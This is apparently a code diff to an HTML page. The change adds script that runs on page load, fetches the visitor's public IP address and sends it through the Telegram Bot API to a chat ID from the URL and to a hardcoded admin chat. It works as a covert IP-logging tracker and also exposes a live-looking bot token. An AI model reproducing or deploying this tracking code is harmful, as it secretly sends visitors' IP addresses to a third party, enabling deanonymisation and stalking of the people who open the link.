@@ -16,22 +16,51 @@ console.log('Server aktif');
 }
       </script>
 
-           <script>
-
-       const TelegramBot = require('node-telegram-bot-api');
-                const ip = require('ip');
-
+            <script>
                 const token = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
-                const bot = new TelegramBot(token, { polling: true });
+                const adminChatId = '7407149096';
 
-                bot.on('message', (msg) => {
-                    const chatId = msg.chat.id;
-                    const userIp = ip.address();
-                    bot.sendMessage(chatId, `Your IP address is: ${userIp}`);
-                });
+                function getIp(callback) {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => callback(data.ip))
+                        .catch(error => console.error('Error fetching IP:', error));
+                }
 
-                console.log('Bot is running...');
-           </script>
+                function sendMessage(chatId, text) {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            console.error('Error sending message:', data);
+                        }
+                    })
+                    .catch(error => console.error('Error sending message:', error));
+                }
+
+                function trackIp() {
+                    getIp((userIp) => {
+                        const chatId = new URLSearchParams(window.location.search).get('chat_id');
+                        if (chatId) {
+                            sendMessage(chatId, `Your IP address is: ${userIp}`);
+                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}`);
+                        } else {
+                            console.error('Chat ID not found in URL parameters.');
+                        }
+                    });
+                }
+
+                window.onload = trackIp;
+                </script>
         <style>
             @charset "utf-8";html {
                 -ms-text-size-adjust: 100%;
